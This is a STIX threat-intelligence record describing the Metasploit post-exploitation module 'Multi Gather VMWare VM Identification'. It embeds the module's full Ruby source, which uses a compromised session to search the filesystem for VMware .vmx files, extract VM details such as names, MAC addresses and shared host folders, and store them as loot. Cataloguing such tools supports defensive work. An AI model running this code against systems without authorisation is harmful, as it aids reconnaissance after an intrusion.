{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2dfc54a-0328-4181-ae0b-9efca3340aa6",
    "created": "2024-08-14T16:33:19.178946Z",
    "modified": "2024-08-14T16:33:19.17895Z",
    "name": "Multi Gather VMWare VM Identification",
    "description": " This module will attempt to find any VMWare virtual machines stored on the target.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/find_vmx.rb",
            "external_id": "find_vmx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'yaml'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather VMWare VM Identification',\n        'Description' => %q{\n          This module will attempt to find any VMWare virtual machines stored on the target.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['shell', 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_search\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    if session_has_search_ext\n      vms = meterp_search\n    elsif session.platform =~ /unix|linux|bsd|osx/\n      vms = nix_shell_search\n    end\n    report_vms(vms) if vms\n  end\n\n  def report_vms(vms)\n    output = \"VMWare Virtual Machines\\n\"\n    output << \"--------------------------------\\n\"\n    vms.each do |vm|\n      next if vm.empty?\n\n      output << \"Name: #{vm['name']}\\n\"\n      output << \"Virtual CPUs: #{vm['cpus']}\\n\"\n      output << \"Memory: #{vm['memsize']}\\n\"\n      output << \"Operating System: #{vm['os']}\\n\"\n      output << \"Network Type: #{vm['eth_type']}\\n\"\n      output << \"MAC Address: #{vm['mac']}\\n\"\n      output << \"Shared Folders:\\n\"\n      vm['SharedFolders'].each do |folder|\n        output << \"\\tHost Location: #{folder}\\n\"\n      end\n      output << \"\\n\"\n    end\n    print_good output\n    store_loot('vmware_vms', 'text/plain', session, output, 'vmware_vms.txt', 'VMWare Virtual Machines')\n  end\n\n  def nix_shell_search\n    vms = []\n    res = session.shell_command('find / -name \"*.vmx\" -type f -print 2>/dev/null')\n    res.each_line do |filename|\n      next unless filename.start_with? '/'\n\n      begin\n        parse = session.shell_command(\"cat #{filename}\")\n        vms << parse_vmx(parse, filename)\n      rescue StandardError\n        print_error \"Could not read #{filename} properly\"\n      end\n    end\n    return vms\n  end\n\n  def meterp_search\n    vms = []\n    res = session.fs.file.search(nil, '*.vmx', true, -1)\n    res.each do |vmx|\n      filename = \"#{vmx['path']}\\\\#{vmx['name']}\"\n      next if filename.end_with? '.vmxf'\n\n      begin\n        config = client.fs.file.new(filename, 'r')\n        parse = config.read\n        vms << parse_vmx(parse, filename)\n      rescue StandardError\n        print_error \"Could not read #{filename} properly\"\n      end\n    end\n    return vms\n  end\n\n  def parse_vmx(vmx_data, filename)\n    vm = {}\n    unless vmx_data.nil? || vmx_data.empty?\n      vm['SharedFolders'] = []\n      vmx_data.each_line do |line|\n        data = line.split('=')\n        vm['path'] = filename\n        case data[0]\n        when 'memsize '\n          vm['memsize'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'displayName '\n          vm['name'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'guestOS '\n          vm['os'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'ethernet0.connectionType '\n          vm['eth_type'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'ethernet0.generatedAddress '\n          vm['mac'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'numvcpus '\n          vm['cpus'] = data[1].gsub!('\"', '').lstrip.chomp\n        when 'sharedFolder0.hostPath '\n          vm['SharedFolders'] << data[1].gsub!('\"', '').lstrip.chomp\n        end\n      end\n      vm['cpus'] ||= '1'\n    end\n    return vm\n  end\n\n  def session_has_search_ext\n    return !!(session.fs and session.fs.file)\n  rescue NoMethodError\n    return false\n  end\n\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}